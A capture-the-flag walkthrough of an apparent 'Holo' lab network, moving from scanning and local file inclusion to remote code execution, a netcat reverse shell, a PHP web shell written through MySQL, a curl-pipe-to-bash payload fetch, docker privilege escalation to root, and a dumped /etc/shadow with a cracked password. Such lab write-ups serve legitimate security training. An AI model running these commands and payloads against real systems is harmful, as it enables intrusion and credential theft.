# Holo Walkthrough

Scope: 10.200.112.0/24 and 192.168.100.0/24.

### Nmap:
```bash
└─$ nmap -sV -sC -p- -v 10.200.112.0/24
Scanning 2 hosts [65535 ports/host]
Discovered open port 22/tcp on 10.200.112.250
Discovered open port 1337/tcp on 10.200.112.250
Discovered open port 22/tcp on 10.200.112.33
Discovered open port 80/tcp on 10.200.112.33
Discovered open port 33060/tcp on 10.200.112.33
```

```bash
└─$ nmap -sV -sC -p 22,80,1337,33060 -A -v 10.200.112.33 10.200.112.250

Nmap scan report for holo.live (10.200.112.33)
Host is up (0.11s latency).

PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1d:bc:c0:2b:9e:98:ed:97:90:da:45:d5:8e:de:a1:7a (RSA)
|   256 91:f5:04:d5:6c:46:52:9a:9d:9e:7d:6b:b6:8d:59:2f (ECDSA)
|_  256 18:83:24:f6:fb:bc:be:5c:85:fb:9d:ea:2b:a6:ea:a4 (ED25519)
80/tcp    open   http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 21 disallowed entries (15 shown)
| /var/www/wordpress/index.php 
| /var/www/wordpress/readme.html /var/www/wordpress/wp-activate.php 
| /var/www/wordpress/wp-blog-header.php /var/www/wordpress/wp-config.php 
| /var/www/wordpress/wp-content /var/www/wordpress/wp-includes 
| /var/www/wordpress/wp-load.php /var/www/wordpress/wp-mail.php 
| /var/www/wordpress/wp-signup.php /var/www/wordpress/xmlrpc.php 
| /var/www/wordpress/license.txt /var/www/wordpress/upgrade 
|_/var/www/wordpress/wp-admin /var/www/wordpress/wp-comments-post.php
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://www.holo.live/
|_http-server-header: Apache/2.4.29 (Ubuntu)
1337/tcp  closed waste
33060/tcp open   mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000

Nmap scan report for 10.200.112.250
Host is up (0.11s latency).

PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0f:6f:f4:97:a2:f1:7a:6a:9c:44:fe:e0:09:05:dd:c6 (RSA)
|   256 59:bd:f8:47:fc:1e:3a:2f:98:fd:84:5f:11:84:f1:84 (ECDSA)
|_  256 f4:cc:6c:f2:ca:dc:fa:74:68:eb:25:b7:f6:ac:09:de (ED25519)
80/tcp    closed http
1337/tcp  open   http    Node.js Express framework
|_http-title: Error
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
33060/tcp closed mysqlx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Vhost Enumertaion

```bash
└─$ gobuster vhost -u http://holo.live -w /usr/share/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt

Found: dev.holo.live
Found: admin.holo.live
```
- Found **robots.txt** on **admin.holo.live/robots.txt**
```text
User-agent: *
Disallow: /var/www/admin/db.php
Disallow: /var/www/admin/dashboard.php
Disallow: /var/www/admin/supersecretdir/creds.txt
```

- Navigate to **dev.holo.live** Found images under the Talents tab.
- On opening the image found that the `img.php` file is used to fetch images. Seems `LFI` vulnerability.
```url
http://dev.holo.live/img.php?file=images/korone.jpg
```
- Insert the file path of the credentials file we found in the **robots.txt** at **admin.holo.live/robots.txt**
```url
dev.holo.live/img.php?file=/var/www/admin/supersecretdir/creds.txt
```
- Got credentials successfully.
```text
I know you forget things, so I'm leaving this note for you:
admin:DBManagerLogin!
- gurag <3
```
- Navigate to **http://admin.holo.live/** and log in using the credentials.

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/3b53ad85-683e-4701-8e50-4d93154e762b)

- Not really find anything interesting in the dashboard, but while looking at the page source, there I found:

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/b526acda-ecba-49a7-85d6-d82f76a7bc90)

- Maybe it is vulnerable to RCE. On trying I successfully got RCE.

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/f64348b8-0234-4582-aefc-71c50db05318)

- Time to get the reverse shell on our system. For this I used [PenetstMonekey NetCat Reverse Shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

`nc -e /bin/sh 10.0.0.1 1234`

```bash
└─$ rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.50.109.29] from (UNKNOWN) [10.200.112.33] 54266
whoami
www-data
```
- In order to make a stable shell we need to run:
```python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- Background the active shell using ctrl+z and use cmds

```bash
stty raw -echo
fg

www-data@40ad97ed7351:/var/www/admin$ whoami
whoami
www-data
```
- In **www** directory we have our 1st flag

- On further enumeration, I found **"db_connect.php"** file under /var/www/admin directory.
```bash
www-data@40ad97ed7351:/var/www/admin$ cat db_connect.php
cat db_connect.php
<?php

define('DB_SRV', '192.168.100.1');
define('DB_PASSWD', "!123SecureAdminDashboard321!");
define('DB_USER', 'admin');
define('DB_NAME', 'DashboardDB');

$connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);

if($connection == false){

        die("Error: Connection to Database could not be made." . mysqli_connect_error());
}
?>
```
- Try to log in to the database from inside the container.
```bash
$ mysql -u admin -p -h 192.168.100.1
Enter password: !123SecureAdminDashboard321!

mysql> show databases;

+--------------------+
| Database           |
+--------------------+
| DashboardDB        |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+

mysql> use DashboardDB

mysql> show tables;
show tables;
+-----------------------+
| Tables_in_DashboardDB |
+-----------------------+
| users                 |
+-----------------------+

mysql> show columns from users;
show columns from users;

+----------+--------------+------+-----+---------+-------+
| Field    | Type         | Null | Key | Default | Extra |
+----------+--------------+------+-----+---------+-------+
| username | varchar(256) | YES  |     | NULL    |       |
| password | varchar(256) | YES  |     | NULL    |       |
+----------+--------------+------+-----+---------+-------+

mysql> select * from users;
select * from users;
+----------+-----------------+
| username | password        |
+----------+-----------------+
| admin    | DBManagerLogin! |
| gurag    | AAAA            |
+----------+-----------------+
```
- Now, Make a new file named `shell.php` by embedding the PHP cmd script inside it using MySQL.

```bash
mysql> select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
```

- Next, we will fetch the file from inside the box using curl cmd with an encoded URL. Make sure to set up a listener.

```bash
URL: curl '192.168.100.1:8080/shell.php?cmd=curl http://<IP>:8081/shell.php | bash &

Encoded URL: curl '192.168.100.1:8080/shell.php?cmd=curl%20http://10.50.109.29:8081/shell.sh%20%7C%20bash%20&'%0A
```
- Successfully got the shell.
```bash
www-data@ip-10-200-112-33:/var/www$ whoami
www-data
```
- On running **Linpeas** I found docker set to SUID bit. Go to GTFO bins and escalate privileges to root.
``` bash
$ ./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
<docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
```
- Didn't work let's list the docker images available.
```bash
$ docker images
docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
<none>              <none>              cb1b741122e8        2 years ago         995MB
<none>              <none>              b711fc810515        2 years ago         993MB
<none>              <none>              591bb8cd4ef6        2 years ago         993MB
<none>              <none>              88d15ba62bf4        2 years ago         993MB
ubuntu              18.04               56def654ec22        2 years ago         63.2MB
```
- Let's go with Ubuntu.
```bash
n$ ./docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
< run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
# whoami
whoami
root
```
- Submit the flag.
- Next, is to stabilize our shell, for this let's enumerate the shadow file.
```bash
# cat /etc/shadow   
cat /etc/shadow
root:$6$TvYo6Q8EXPuYD8w0$Yc.Ufe3ffMwRJLNroJuMvf5/Telga69RdVEvgWBC.FN5rs9vO0NeoKex4jIaxCyWNPTDtYfxWn.EM4OLxjndR1:18605:0:99999:7:::
daemon:*:18512:0:99999:7:::
bin:*:18512:0:99999:7:::
sys:*:18512:0:99999:7:::
sync:*:18512:0:99999:7:::
games:*:18512:0:99999:7:::
man:*:18512:0:99999:7:::
lp:*:18512:0:99999:7:::
mail:*:18512:0:99999:7:::
news:*:18512:0:99999:7:::
uucp:*:18512:0:99999:7:::
proxy:*:18512:0:99999:7:::
www-data:*:18512:0:99999:7:::
backup:*:18512:0:99999:7:::
list:*:18512:0:99999:7:::
irc:*:18512:0:99999:7:::
gnats:*:18512:0:99999:7:::
nobody:*:18512:0:99999:7:::
systemd-network:*:18512:0:99999:7:::
systemd-resolve:*:18512:0:99999:7:::
systemd-timesync:*:18512:0:99999:7:::
messagebus:*:18512:0:99999:7:::
syslog:*:18512:0:99999:7:::
_apt:*:18512:0:99999:7:::
tss:*:18512:0:99999:7:::
uuidd:*:18512:0:99999:7:::
tcpdump:*:18512:0:99999:7:::
sshd:*:18512:0:99999:7:::
landscape:*:18512:0:99999:7:::
pollinate:*:18512:0:99999:7:::
ec2-instance-connect:!:18512:0:99999:7:::
systemd-coredump:!!:18566::::::
ubuntu:!$6$6/mlN/Q.1gopcuhc$7ymOCjV3RETFUl6GaNbau9MdEGS6NgeXLM.CDcuS5gNj2oIQLpRLzxFuAwG0dGcLk1NX70EVzUUKyUQOezaf0.:18601:0:99999:7:::
lxd:!:18566::::::
mysql:!:18566:0:99999:7:::
dnsmasq:*:18566:0:99999:7:::
linux-admin:$6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:18570:0:99999:7:::
```
- Hash cracked for user `linux-admin`.
```bash
user- linux-admin
pass- linuxrulez
```
